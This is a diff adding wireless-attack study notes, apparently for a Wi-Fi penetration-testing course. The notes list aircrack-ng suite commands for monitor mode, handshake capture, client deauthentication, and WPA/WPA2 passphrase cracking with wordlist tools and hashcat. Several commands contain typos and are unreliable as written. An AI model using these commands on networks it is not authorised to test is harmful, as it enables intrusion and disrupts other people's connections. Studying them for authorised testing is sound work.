@@ -1,0 +1,123 @@
+##########################################################################################
+
+airmon-ng
+airmon-ng check  (Check for background Processes)
+airmon-ng check kill (Kill all background processes)
+airmon-ng start wlan0   (Run Monitor mode )
+airmon-ng start wlan0 2  (Run  Monitor Mode on channel 2)
+airmon-ng stop wlan0 2  (Run Monitor mode on specific Channel)
+
+iw dev wlan0mon  info ( Check the channel adapter is listening on)
+iwconfig
+
+####################################################################################################
+
+airodump-ng (Used to capture raw 802.11 frames , WPA/WPA2 Handshakes )
+airodump-ng -c <> wlan0mon
+airodump-ng -c <> --bssid <target MAC> wlan0mon (precision sniffing)
+airodump-ng -w  <file prefix> -c <> --output-format csv,pcap wlan0mon
+airodum-g -c 3 -w wpa --essid <essid> --bssid <bssid> wlan0mon
+
+ls | grep wpa
+
+INTERACTIVE MODE
+
+space , tab , m (highlight)  , a (ap+sta+ack)(dispay) , s( pwr , bssid , no. of beacons  & data packets , packet rate , channel , first screen etc) (sorting) , I (invert selection) , d (reset to default(pwr))
+
+######################################################################################################
+
+aireplay-ng (generating wireless traffic)
+
+BASIC INJECTION TEST ( for aps taht respond to broadcast probes)
+
+airmon-ng start wlan0 2
+aireplay-ng - 9 wlan0mon
+aireplay-ng - 9 -e <essid> -a <bssid> wlan0mon [ does  wait for beacon frame ]
+aireplay-ng - 9 -e <essid> -a <bssid> -d wlan0mon  [ -d : disable ap detection ] [ does not wait for beacon frame ]
+
+CARD TO CARD ATTACK ( INJ TEST ) [Guarantees frames are actually sent correctly]
+
+aireplay-ng - 9 -e <essid> -a <bssid> -i wlan1mon wlan0mon [additional cap interfce]
+
+aireplay-ng -0 1 -a <bssid> -c <client mac> wlan0mon
+
+############################################################################################################
+
+aircrack-ng (Used to crack WPA and WPA2 network that use PSK or PMK ID) (can work simply on a capture file as well)
+
+aircrack-ng -S  (speedtest)
+aircrack-ng -w /usr/share/john/pass.lst -e <essid> -b <bssid> cap.cap
+
+CUSTOM WORDLISTS
+
+Analyze OUI with help of first three octets of MAC {oui loopkup wireshark}
+
+1) JOHN THE RIPPER :
+	 grep -i password /usr/share/john/password.lst
+	 mousepad /etc/john/john.conf [add rules to line 961.962.963]
+			#add 2 no.s at end of each pass
+			$[0-9]$[0-9]
+			$[0-9]
+	   john --worldist=/usr/share/share/john/passwords.lst --rules --stdout | grep -i Pass123
+	   
+	   john --worldist=/usr/share/share/john/passwords.lst --rules --stdout | aircrack-ng -e <essid> -w - ~/cap.cap
+	
+2)CRUNCH
+	crunch 8 9 [min & max char]    { @ : lowercase or chars from a defined set} { ,  : uppercsase } { %  : numbers } { ^ symbols }
+	crunch 8 9 abc123
+	crunch 11 11 -t Password%%%
+	crunch 1 1 -p dog cat bird
+	crunch 5 5 -t ddd%% -p dog cat bird
+	crunch 5 5   XYZ -t ddd@@ -p dog cat bird
+	
+	crunch 11 11 -t Password%%% | aircrack-ng -e <essid> -w - cap.cap
+
+3)RS MANGLER
+	rsmangler --file wordlist.txt --output mangled.txt
+	cat wordlist.txt | rsmangler --file  -
+	rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e <essid> -w - cap.cap
+
+4)HASHCAT 
+	hashcat -I [OpenCL is slower than aircrack-ng]
+	hashcat -b [Shows All Hash Modes]
+	hashcat -b -m 2500  [WPA EAPOL , WPA2 EAPOL hashes]
+	
+	/usr/lib/hashcat-utils/cap2hccapx.bin  wifu-01.cap  output.hccapx
+	hashcat -m 2500 output.hccapx /usr/share/john/password.lst [--session hashcat , --restore (restore old session)]
+	
+#############################################################################################################
+
+airdecap-ng [ Used to crack WEP ,WPA and WPA2 network that use PSK ] [Used to strip wireless headers from a unencrypted wireless captures]
+
+airdecap-ng -b <ap bssid > .capfile 
+airdecap-ng -b <bssid> -e <essid> -p <cracked pass> cap.cap (confirm cracked password)
+
+##############################################################################################################
+
+airgraph-ng {used to makle graphs for airodump-ng files]
+
+1)Clients to AP Relationship Graph
+	airgraph-ng -i <dump.csv> -o -g CAPR -o <output.png>
+2)Cliwnts to Probe Graph
+	airgraph-ng -i <dump.csv> -o -g CPG -o <output.png>
+
+###########################################################################################################
+
+ airolib-ng [Store bssid and password lists] [ sqlite 3 database] [ compute pmk to compare wpa wpa2 passphrase] {pre computed pmk for essid to derive ptk]
+ 	echo wifu > essid.txt
+ 	airolib-ng wifu.sqlite --import essid essid.txt
+ 	airolib-ng wifu.sqlite --stats
+ 	airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst
+ 	airolib-ng wifu.sqlite --batch
+ 
+ 	aircrack-ng -r wifu.sqlite cap.cap
+ 
+###############################################################################################################
+
+COWPATTY (Recovers PSK using Dictionary & Rainbow Tables Attacks) (essid is combined with PSK to ceate hash)
+
+genpmk -f /usr/share/john/password.lst  -d  <ouputfilename> -s wifu <essid>
+
+cowpatty -r cap.cap -d <ouputfilename> -s <essid>
+
+##############################################################################################################
